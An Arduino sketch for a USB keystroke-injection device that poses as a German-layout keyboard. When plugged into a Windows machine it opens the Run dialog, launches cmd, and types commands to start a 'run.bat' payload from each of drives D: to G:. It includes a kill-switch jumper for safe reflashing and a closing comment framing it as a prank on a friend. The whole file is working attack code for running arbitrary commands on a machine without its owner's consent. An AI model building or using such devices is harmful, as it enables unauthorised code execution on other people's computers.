#include <Keyboard.h>

int Killswitch = 2;       // It's recommended to solder a jumper to Pin 2 to prevent triggering during programming

void setup() 
{
  pinMode(Killswitch, INPUT_PULLUP);        //Sets Killswitch Pin to Pullup
  
  Keyboard.begin(KeyboardLayout_de_DE);    // Sets keyboard layout to German
}

void loop() 
{
  while(digitalRead(Killswitch) == HIGH)  //Loop that prevents payload launch when reflashing
  {
    delay(500);
  }
  
  Keyboard.press(KEY_LEFT_GUI);   //Press Windows Key
  Keyboard.press('r');            //Press r key
  delay(100);
  Keyboard.releaseAll();          // Release keys after "run" is launched
  Keyboard.println("cmd");        // Lanch cmd
  delay(500);                     // Wait for cmd to start up (Increase if you're using Potato PCs)

  // Lanch run.bat (For now it's optimized for the use with a seperate USB stick to launch the payload)
  Keyboard.println("D:");           // Type USB drive letter into cmd
  Keyboard.println("run.bat");      //start run.bat
  // The following lines in this example exists because the target machine has a bunch of drives connected, so the controller has to check where run.bat is 
  Keyboard.println("E:");
  Keyboard.println("run.bat");
  Keyboard.println("F:");
  Keyboard.println("run.bat");
  Keyboard.println("G:");
  Keyboard.println("run.bat");
  delay(1000);    // Your time to laugh as you just scared your friend
}
